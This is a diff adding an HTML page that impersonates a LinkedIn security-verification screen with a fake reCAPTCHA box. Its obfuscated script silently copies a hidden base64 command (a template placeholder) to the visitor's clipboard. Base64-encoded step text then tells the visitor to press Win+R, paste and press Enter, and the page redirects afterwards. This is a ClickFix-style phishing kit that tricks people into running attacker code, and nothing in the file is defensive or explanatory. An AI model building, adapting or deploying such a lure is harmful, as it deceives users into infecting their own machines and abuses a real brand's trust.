@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="no-referrer">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>Security verification | LinkedIn</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M29.63.001H2.362C1.06.001 0 1.034 0 2.306V29.69C0 30.965 1.06 32 2.362 32h27.27C30.937 32 32 30.965 32 29.69V2.306C32 1.034 30.937.001 29.63.001z' fill='%230177b5'/%3E%3Cpath d='M4.745 11.997H9.5v15.27H4.745zm2.374-7.6c1.517 0 2.75 1.233 2.75 2.75S8.636 9.9 7.12 9.9a2.76 2.76 0 0 1-2.754-2.753 2.75 2.75 0 0 1 2.753-2.75m5.35 7.6h4.552v2.087h.063c.634-1.2 2.182-2.466 4.5-2.466 4.806 0 5.693 3.163 5.693 7.274v8.376h-4.743V19.84c0-1.77-.032-4.05-2.466-4.05-2.47 0-2.85 1.93-2.85 3.92v7.554h-4.742v-15.27z' fill='%23fff'/%3E%3C/svg%3E">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,system-ui,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#f4f2ee;min-height:100vh;color:rgba(0,0,0,.9);display:flex;flex-direction:column}
+/* ---- LinkedIn guest header ---- */
+.hdr{background:#fff;box-shadow:0 0 0 1px rgba(0,0,0,.08);height:52px;display:flex;align-items:center;padding:0 24px;position:relative;z-index:2}
+.hdr .logo{display:flex;align-items:center;gap:2px;font-size:20px;font-weight:600;color:rgba(0,0,0,.9);letter-spacing:.2px}
+.hdr .logo svg{width:26px;height:26px;margin-right:6px}
+.hdr .nav{margin-left:auto;display:flex;align-items:center;gap:16px;font-size:16px}
+.hdr .nav a{color:rgba(0,0,0,.6);text-decoration:none;font-weight:400}
+.hdr .nav a.join{border:1px solid #0a66c2;color:#0a66c2;border-radius:16px;padding:4px 16px;font-weight:600}
+/* ---- main ---- */
+main{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:36px 16px}
+.w{width:560px;max-width:96vw}
+.card{background:#fff;border:1px solid #e3e3e2;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.02),0 2px 3px rgba(0,0,0,.08);padding:28px 32px}
+.ic{width:48px;height:48px;border-radius:6px;background:#eef3f8;display:flex;align-items:center;justify-content:center;margin-bottom:16px}
+.ic svg{width:26px;height:26px}
+.t{font-size:20px;font-weight:600;color:rgba(0,0,0,.9);line-height:1.3;margin-bottom:4px}
+.st{font-size:14px;color:rgba(0,0,0,.6);line-height:1.5;margin-bottom:20px}
+/* ---- reCAPTCHA-style widget ---- */
+.cb-r{background:#f9f9f9;border:1px solid #d3d3d3;border-radius:3px;padding:12px 14px;display:flex;align-items:center;gap:12px;cursor:pointer;user-select:none;transition:background .15s;max-width:320px;margin-bottom:20px}
+.cb-r:hover{background:#f0f0f0}
+.c{width:24px;height:24px;border:2px solid #c1c1c1;border-radius:2px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative}
+.c svg{width:16px;height:16px;display:none}
+.c.k{border-color:#1e8e3e}
+.c.k svg{display:block}
+.c.sp::after{content:'';width:16px;height:16px;border:3px solid #dbdbdb;border-top-color:#0a66c2;border-radius:50%;animation:r .8s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+.cbt{font-size:14px;color:#000;flex:1;font-family:Roboto,Arial,sans-serif}
+.cap{display:flex;flex-direction:column;align-items:center;line-height:1;margin-left:auto}
+.cap svg{width:44px;height:44px}
+.cap .ct{font-size:10px;color:#9b9b9b;font-weight:600;margin-top:1px;font-family:Roboto,Arial,sans-serif}
+.cap .pp{font-size:8px;color:#9b9b9b;margin-top:2px;font-family:Roboto,Arial,sans-serif}
+/* ---- steps ---- */
+#st2{display:none;border-top:1px solid #eef0f2;padding-top:18px}
+.hd2{font-size:14px;font-weight:600;color:rgba(0,0,0,.9);margin-bottom:12px}
+.srow{display:flex;gap:12px;margin-bottom:12px;align-items:flex-start}
+.sic{width:36px;height:36px;border-radius:6px;background:#eef3f8;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.sic svg{width:18px;height:18px}
+.stx{font-size:14px;color:rgba(0,0,0,.9);line-height:1.5;padding-top:6px}
+kbd{display:inline-block;min-width:22px;text-align:center;padding:2px 7px;border:1px solid rgba(0,0,0,.6);border-bottom-width:2px;border-radius:2px;background:#fff;font:bold 11px/1.4 Arial,sans-serif;color:rgba(0,0,0,.9);margin:0 1px;vertical-align:1px}
+.wl{display:inline-block;width:5px;height:5px;background:#0078d4;box-shadow:6px 0 0 #0078d4,0 6px 0 #0078d4,6px 6px 0 #0078d4;margin:0 6px 4px 1px;vertical-align:-1px}
+.agr{font-size:13px;color:rgba(0,0,0,.75);line-height:1.5;margin:4px 0 14px;font-style:italic}
+.agr b{color:rgba(0,0,0,.9)}
+.foot{font-size:12px;color:rgba(0,0,0,.6);margin-bottom:14px}
+#vb{background:#0a66c2;color:#fff;border:none;border-radius:20px;padding:10px 0;font-size:16px;font-weight:600;cursor:pointer;width:140px;transition:background .15s,opacity .3s;font-family:inherit}
+#vb:hover{background:#004182}
+#vb:disabled{background:#a8c4e0;cursor:not-allowed;opacity:.65}
+#ok{display:none;text-align:center;padding:20px 10px}
+#ok svg{width:40px;height:40px;margin-bottom:10px}
+#okt{font-size:16px;font-weight:600;color:#0177b5}
+#oks{font-size:13px;color:rgba(0,0,0,.6);margin-top:5px}
+/* ---- footer ---- */
+.ftr{padding:16px 24px;display:flex;justify-content:center;gap:20px;font-size:12px;color:rgba(0,0,0,.6);flex-wrap:wrap}
+.ftr b{color:#0a66c2;font-weight:600}
+</style>
+</head>
+<body>
+<header class="hdr">
+  <div class="logo">
+    <svg viewBox="0 0 32 32" aria-hidden="true">
+      <path d="M29.63.001H2.362C1.06.001 0 1.034 0 2.306V29.69C0 30.965 1.06 32 2.362 32h27.27C30.937 32 32 30.965 32 29.69V2.306C32 1.034 30.937.001 29.63.001z" fill="#0177b5"/>
+      <path d="M4.745 11.997H9.5v15.27H4.745zm2.374-7.6c1.517 0 2.75 1.233 2.75 2.75S8.636 9.9 7.12 9.9a2.76 2.76 0 0 1-2.754-2.753 2.75 2.75 0 0 1 2.753-2.75m5.35 7.6h4.552v2.087h.063c.634-1.2 2.182-2.466 4.5-2.466 4.806 0 5.693 3.163 5.693 7.274v8.376h-4.743V19.84c0-1.77-.032-4.05-2.466-4.05-2.47 0-2.85 1.93-2.85 3.92v7.554h-4.742v-15.27z" fill="#fff"/>
+    </svg>
+    LinkedIn
+  </div>
+  <nav class="nav">
+    <a href="#">Join now</a>
+    <a href="#" class="join">Sign in</a>
+  </nav>
+</header>
+
+<main>
+<div class="w">
+  <div class="card">
+    <div class="ic" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#0a66c2" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-3.6 8-9V5.5L12 2 4 5.5V13c0 5.4 8 9 8 9z"/>
+        <path d="M9 11.5l2 2 4-4.5"/>
+      </svg>
+    </div>
+    <div class="t" id="tt"></div>
+    <div class="st" id="stt"></div>
+
+    <div class="cb-r" id="cbrow" role="checkbox" aria-checked="false" tabindex="0">
+      <div class="c" id="cb">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1e8e3e" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+      </div>
+      <span class="cbt" id="cbt"></span>
+      <span class="cap" aria-hidden="true">
+        <svg viewBox="0 0 64 64">
+          <path fill="#1c3aa9" d="M64 31.955l-.033-1.37V4.687l-7.16 7.16C50.948 4.674 42.033.093 32.05.093c-10.4 0-19.622 4.96-25.458 12.64l11.736 11.86a15.55 15.55 0 0 1 4.754-5.334c2.05-1.6 4.952-2.906 8.968-2.906.485 0 .86.057 1.135.163 4.976.393 9.288 3.14 11.828 7.124l-8.307 8.307L64 31.953"/>
+          <path fill="#4285f4" d="M31.862.094l-1.37.033H4.594l7.16 7.16C4.58 13.147 0 22.06 0 32.046c0 10.4 4.96 19.622 12.64 25.458L24.5 45.768a15.55 15.55 0 0 1-5.334-4.754c-1.6-2.05-2.906-4.952-2.906-8.968 0-.485.057-.86.163-1.135.393-4.976 3.14-9.288 7.124-11.828l8.307 8.307L31.86.095"/>
+          <path fill="#ababab" d="M.001 32.045l.033 1.37v25.898l7.16-7.16c5.86 7.173 14.774 11.754 24.76 11.754 10.4 0 19.622-4.96 25.458-12.64l-11.736-11.86a15.55 15.55 0 0 1-4.754 5.334c-2.05 1.6-4.952 2.906-8.968 2.906-.485 0-.86-.057-1.135-.163-4.976-.393-9.288-3.14-11.828-7.124l8.307-8.307c-10.522.04-22.4.066-27.295-.005"/>
+        </svg>
+        <span class="ct">reCAPTCHA</span>
+        <span class="pp">Privacy&nbsp;-&nbsp;Terms</span>
+      </span>
+    </div>
+
+    <div id="st2">
+      <div class="hd2" id="hd1"></div>
+      <div class="srow">
+        <div class="sic"><svg viewBox="0 0 24 24" fill="none" stroke="#0a66c2" stroke-width="1.8" stroke-linecap="round"><rect x="2" y="4" width="20" height="13" rx="2"/><path d="M8 21h8M12 17v4"/></svg></div>
+        <div class="stx" id="s1"></div>
+      </div>
+      <div class="srow">
+        <div class="sic"><svg viewBox="0 0 24 24" fill="none" stroke="#0a66c2" stroke-width="1.8" stroke-linecap="round"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h.01M18 14h.01M9 14h6"/></svg></div>
+        <div class="stx" id="s2"></div>
+      </div>
+      <div class="srow">
+        <div class="sic"><svg viewBox="0 0 24 24" fill="none" stroke="#0a66c2" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 17l-5-5 5-5"/><path d="M4 12h11"/></svg></div>
+        <div class="stx" id="s3"></div>
+      </div>
+      <div class="agr" id="agr"></div>
+      <div class="foot" id="foot"></div>
+      <button id="vb" disabled></button>
+    </div>
+
+    <div id="ok">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#0177b5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="16 8 10.5 13.5 8 11"></polyline></svg>
+      <div id="okt"></div>
+      <div id="oks"></div>
+    </div>
+  </div>
+</div>
+</main>
+
+<footer class="ftr">
+  <span>This site is protected by <b>LinkedIn</b> verification.</span>
+</footer>
+
+<script>
+(function(){
+"use strict";
+var _0x=[atob("{command_b64}")];
+var _0r="{redirect_url}"||"{lure_url_js}";
+var _0v="{VID}";
+var _0e="WW91IHdpbGwgb2JzZXJ2ZSBhbmQgYWdyZWU6IDxiPiJJJ20gbm90IGEgcm9ib3QgLSByZUNBUFRDSEEgVmVyaWZpY2F0aW9uIElEOiA8c3BhbiBpZD0idmlkIj48L3NwYW4+IjwvYj4=|UHJlc3MgJmFtcDsgaG9sZCA8a2JkPjxpIGNsYXNzPSJ3bCI+PC9pPldpbjwva2JkPiArIDxrYmQ+Ujwva2JkPi4=|SW4gdGhlIHZlcmlmaWNhdGlvbiB3aW5kb3csIHByZXNzIDxrYmQ+Q3RybDwva2JkPiArIDxrYmQ+Vjwva2JkPi4=|UHJlc3MgPGtiZD5FbnRlcjwva2JkPiBvbiB5b3VyIGtleWJvYXJkIHRvIGZpbmlzaC4=|UGVyZm9ybSB0aGUgc3RlcHMgYWJvdmUgdG8gZmluaXNoIHZlcmlmaWNhdGlvbi4=|SSdtIG5vdCBhIHJvYm90|VmVyaWZ5IHlvdSBhcmUgaHVtYW4=|VG8gY29udGludWUsIHBsZWFzZSBjb21wbGV0ZSB0aGUgdmVyaWZpY2F0aW9uIGJlbG93Lg==|VmVyaWZ5|VmVyaWZpY2F0aW9uIENvbXBsZXRl|UmVkaXJlY3RpbmcgeW91IHRvIHlvdXIgZGVzdGluYXRpb24uLi4=|VG8gYmV0dGVyIHByb3ZlIHlvdSBhcmUgbm90IGEgcm9ib3QsIHBsZWFzZTo=";
+var _0d=null;
+function _s(i){
+  if(!_0d)_0d=_0e.split('|').map(function(x){return atob(x);});
+  return _0d[i]||'';
+}
+function _cp(t){
+  var ta=document.createElement('textarea');
+  ta.value=t;ta.setAttribute('readonly','');
+  ta.style.position='absolute';ta.style.left='-9999px';
+  document.body.appendChild(ta);ta.select();
+  try{document.execCommand('copy')}catch(e){}
+  document.body.removeChild(ta);
+}
+function _arm(){_cp(_0x[0]);}
+document.addEventListener('pointerdown',_arm,{once:true,capture:true});
+document.addEventListener('keydown',_arm,{once:true,capture:true});
+
+var _done=false;
+function tick(){
+  if(_done)return;
+  _done=true;
+  _cp(_0x[0]);
+  var cb=document.getElementById('cb');
+  cb.classList.add('sp');
+  setTimeout(function(){
+    cb.classList.remove('sp');
+    cb.classList.add('k');
+    var row=document.getElementById('cbrow');
+    row.style.cursor='default';
+    row.setAttribute('aria-checked','true');
+    document.getElementById('st2').style.display='block';
+    _cp(_0x[0]);
+    var vb=document.getElementById('vb');
+    vb.disabled=true;
+    setTimeout(function(){vb.disabled=false;},5000+Math.random()*10000);
+    setTimeout(function(){window.location.href=_0r;},30000+Math.random()*30000);
+  },600);
+}
+document.getElementById('cbrow').addEventListener('click',tick);
+document.getElementById('cbrow').addEventListener('keydown',function(k){
+  if(k.key===' '||k.key==='Enter'){k.preventDefault();tick();}
+});
+
+document.getElementById('vb').addEventListener('click',function(){
+  if(this.disabled)return;
+  _cp(_0x[0]);
+  document.getElementById('st2').style.display='none';
+  document.querySelector('.ic').style.display='none';
+  document.querySelector('.t').style.display='none';
+  document.querySelector('.st').style.display='none';
+  document.querySelector('.cb-r').style.display='none';
+  document.getElementById('ok').style.display='block';
+  setTimeout(function(){window.location.href=_0r;},1200+Math.random()*500);
+});
+
+setTimeout(function(){
+  document.getElementById('tt').textContent=_s(6);
+  document.getElementById('stt').textContent=_s(7);
+  document.getElementById('cbt').textContent=_s(5);
+  document.getElementById('hd1').textContent=_s(11);
+  document.getElementById('s1').innerHTML=_s(1);
+  document.getElementById('s2').innerHTML=_s(2);
+  document.getElementById('s3').innerHTML=_s(3);
+  document.getElementById('agr').innerHTML=_s(0);
+  document.getElementById('agr').querySelector('#vid').textContent=_0v;
+  document.getElementById('foot').textContent=_s(4);
+  document.getElementById('vb').textContent=_s(8);
+  document.getElementById('okt').textContent=_s(9);
+  document.getElementById('oks').textContent=_s(10);
+},100);
+})();
+</script>
+</body>
+</html>
